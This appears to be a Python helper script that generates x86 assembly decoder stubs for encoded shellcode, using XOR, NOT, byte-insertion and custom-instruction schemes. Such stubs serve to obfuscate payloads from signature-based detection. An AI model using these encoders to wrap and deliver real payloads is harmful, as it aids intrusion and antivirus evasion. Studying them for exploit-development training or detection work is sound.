#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Author: Simone Cardona
	
def asm_generate_xor(len, shellcode):
	xor_reverse = """
global _start
section .text
_start:
	jmp short call_decoder
	
decoder:
	pop esi
	xor ecx,ecx
	mov cl,%s
	
decode:
	xor byte [esi], 0xaa
	inc esi
	loop decode
	jmp short Shellcode
	
call_decoder:
	call decoder
	Shellcode: db %s
	
""" % (len, shellcode)
	return xor_reverse
	
def asm_generate_random(len,instruction, shellcode):
	random_reverse = """
global _start
section .text
_start:
	jmp short call_decoder
	
decoder:
	pop esi
	xor ecx,ecx
	mov cl,%s
	
decode:
	%s
	inc esi
	loop decode
	jmp short Shellcode
	
call_decoder:
	call decoder
	Shellcode: db %s
	
""" % (len, instruction, shellcode)
	return random_reverse	
	
def asm_generate_insertion(encoded):
	insertion = """
global _start			

section .text
_start:

	jmp short call_shellcode

decoder:
	pop esi
	lea edi, [esi +1]
	xor eax, eax
	mov al, 1
	xor ebx, ebx

decode: 
	mov bl, byte [esi + eax]
	xor bl, 0xaa
	jnz short EncodedShellcode
	mov bl, byte [esi + eax + 1]
	mov byte [edi], bl
	inc edi
	add al, 2
	jmp short decode	



call_shellcode:

	call decoder
	EncodedShellcode: db %s0xbb,0xbb
""" % (encoded)
	return insertion
	
def asm_generate_not(leng, encoded):
	no = """
global _start			

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi
	xor ecx, ecx
	mov cl, %s


decode:

	not byte [esi]
	inc esi
	loop decode

	jmp short EncodedShellcode

call_shellcode:

	call decoder

	EncodedShellcode: db %s	
""" % (leng, encoded)
	return no
